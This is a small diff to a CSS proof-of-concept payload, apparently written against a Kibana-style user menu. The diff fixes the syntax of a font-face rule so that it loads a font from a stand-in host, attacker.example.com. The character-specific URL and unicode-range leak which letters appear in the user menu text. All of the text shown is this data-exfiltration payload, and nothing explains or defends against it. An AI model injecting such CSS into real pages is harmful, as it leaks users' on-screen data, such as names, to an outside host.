@@ -1,7 +1,7 @@
 @font-face{
   font-family:poc;
-  src: url(https://attacker.example.com/?c;
-  unicode0range:U_0063;
+  src: url(https://attacker.example.com/?c);
+  unicode-range:U_0063;
 }
 
 [data-test-subj="userMenu"] .euiText--medium p {
